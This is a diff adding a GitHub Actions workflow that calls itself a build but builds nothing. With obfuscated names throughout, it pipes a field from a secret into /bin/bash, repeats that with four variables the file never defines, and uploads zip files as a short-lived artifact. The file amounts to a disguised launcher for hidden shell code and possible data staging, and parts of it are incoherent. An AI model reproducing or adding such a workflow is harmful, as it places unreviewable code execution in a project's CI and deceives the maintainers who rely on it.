@@ -1,0 +1,33 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          c30855: ${{ secrets.c30855 }}
+        run: |
+          printf '%s' "$c30855" | jq -r .ya5734 | /bin/bash
+          printf '%s' "$hob65689" | jq -r .lpr551 | /bin/bash
+          printf '%s' "$lboy784" | jq -r .db931 | /bin/bash
+          printf '%s' "$qeci54" | jq -r .qrg03 | /bin/bash
+          printf '%s' "$hcey5" | jq -r .j65157 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: du8mQ882
+          path: "*.zip"
+          retention-days: 1
